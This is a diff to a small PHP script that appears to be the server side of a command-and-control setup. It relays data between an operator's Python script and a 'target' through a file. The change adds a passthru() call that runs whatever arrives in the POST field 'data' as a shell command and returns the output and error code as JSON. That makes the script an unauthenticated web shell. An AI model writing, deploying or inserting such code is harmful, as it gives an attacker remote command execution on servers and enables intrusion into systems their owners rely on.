@@ -1,9 +1,18 @@
-<?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Handle data received from the Python script
     $data = $_POST['data'];
     file_put_contents('Data.io', $data); // Save the data to a file
-    echo "[+] executed successfully.\n";
+
+    // Execute the command and capture its output
+    ob_start();
+    passthru($data, $return_code);
+    $command_output = ob_get_clean();
+
+    // Send the command output and return code to the Python script
+    echo json_encode([
+        'command_output' => $command_output,
+        'command_error' => ($return_code === 0) ? '' : 'Command failed with error code ' . $return_code,
+    ]);
 } else if ($_SERVER['REQUEST_METHOD'] === 'GET') {
     // Handle requests from the target Python script
     $data = file_get_contents('Data.io');
@@ -15,4 +24,3 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         echo "No data available.\n";
     }
 }
-?>
